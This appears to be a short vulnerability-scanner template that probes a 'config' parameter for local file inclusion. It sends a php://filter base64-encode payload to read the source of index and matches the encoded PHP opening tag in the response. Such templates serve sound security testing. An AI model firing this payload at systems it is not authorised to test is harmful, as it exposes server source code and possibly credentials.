id: lfi6-0748
name: 'Traversal in config'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via config'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      config:
        - 'php://filter/convert.base64-encode/resource=index'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
